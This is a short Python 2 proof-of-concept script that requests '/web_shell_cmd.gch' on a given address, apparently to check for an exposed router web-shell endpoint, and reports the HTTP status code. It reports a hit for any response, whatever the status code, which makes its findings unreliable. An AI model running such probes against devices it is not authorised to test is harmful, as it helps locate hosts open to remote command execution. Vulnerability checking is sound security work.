#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'

import requests


def poc(address):
    try:
        resp = requests.get('http://' + address + '/web_shell_cmd.gch', timeout=5)
        if resp is not None:
            return address + ': ' + str(resp.status_code)
        else:
            return False
    except requests.RequestException as e:
        # print address + ': timeout'
        return False
    except Exception as e:
        print e
        return False